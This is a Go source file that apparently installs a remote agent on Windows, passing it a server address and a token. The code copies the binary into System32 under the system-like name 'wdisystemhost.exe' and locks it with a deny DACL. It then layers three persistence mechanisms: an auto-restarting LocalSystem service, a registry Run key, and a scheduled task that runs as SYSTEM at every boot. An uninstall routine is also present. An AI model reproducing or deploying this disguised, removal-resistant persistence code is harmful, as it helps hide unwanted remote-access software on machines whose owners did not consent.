//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/svc/mgr"
)

func installWindows(exe, server, token, id string) error {
	// 1. Deploy binary to System32 with file DACL protection.
	protectedPath, err := deployBinary(exe)
	if err != nil {
		fmt.Printf("[!] Deploy to System32 failed, using original path: %v\n", err)
		protectedPath = exe
	} else {
		fmt.Printf("[+] Binary deployed to %s\n", protectedPath)
	}

	// 2. Register the Windows service pointing to the protected binary.
	if err := registerService(protectedPath, server, token, id); err != nil {
		return err
	}

	// 3. Registry Run key — fires on user login if service is removed.
	if err := addRegistryPersistence(protectedPath, server, token, id); err != nil {
		fmt.Printf("[!] Registry persistence: %v\n", err)
	} else {
		fmt.Println("[+] Registry Run key added.")
	}

	// 4. Scheduled task — fires as SYSTEM at every boot regardless of service state.
	if err := addScheduledTask(protectedPath, server, token, id); err != nil {
		fmt.Printf("[!] Scheduled task: %v\n", err)
	} else {
		fmt.Println("[+] Scheduled task added.")
	}

	return nil
}

func registerService(exePath, server, token, id string) error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("SCM connect (run as Admin): %w", err)
	}
	defer m.Disconnect()

	// Remove stale entry if present.
	if old, err := m.OpenService(svcName); err == nil {
		old.Close()
		uninstallFromManager(m)
	}

	args := []string{"--server", server, "--token", token}
	if id != "" {
		args = append(args, "--id", id)
	}

	s, err := m.CreateService(svcName, exePath, mgr.Config{
		DisplayName:      svcDisplay,
		Description:      svcDesc,
		StartType:        mgr.StartAutomatic,
		ServiceStartName: "LocalSystem",
	}, args...)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}
	defer s.Close()

	// Restart immediately on first two failures, 60s on third.
	if err := s.SetRecoveryActions([]mgr.RecoveryAction{
		{Type: mgr.ServiceRestart, Delay: 0},
		{Type: mgr.ServiceRestart, Delay: 0},
		{Type: mgr.ServiceRestart, Delay: 60 * time.Second},
	}, 86400); err != nil {
		fmt.Printf("[!] SetRecoveryActions: %v\n", err)
	}

	if err := s.Start(); err != nil {
		return fmt.Errorf("start service: %w", err)
	}

	fmt.Printf("[+] Service '%s' installed and running.\n", svcName)
	return nil
}

func uninstallWindows() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("SCM connect (run as Admin): %w", err)
	}
	defer m.Disconnect()

	if err := uninstallFromManager(m); err != nil {
		fmt.Printf("[!] Service removal: %v\n", err)
	}

	removeRegistryPersistence()
	fmt.Println("[+] Registry Run key removed.")

	removeScheduledTask()
	fmt.Println("[+] Scheduled task removed.")

	// Remove the protected binary from System32 (requires removing file DACL first).
	removeBinaryFromSystem32()

	return nil
}

func uninstallFromManager(m *mgr.Mgr) error {
	s, err := m.OpenService(svcName)
	if err != nil {
		return fmt.Errorf("service not found: %w", err)
	}
	defer s.Close()

	exec.Command("sc.exe", "stop", svcName).Run()
	time.Sleep(2 * time.Second)

	return s.Delete()
}

// removeBinaryFromSystem32 strips the deny DACL from the deployed binary then
// deletes it, so --uninstall leaves no traces.
func removeBinaryFromSystem32() {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}

	path := filepath.Join(sysRoot, "System32", "wdisystemhost.exe")
	if _, err := os.Stat(path); err == nil {
		clearFileDACL(path)
		os.Remove(path)
		fmt.Printf("[+] Removed %s\n", path)
	}
}
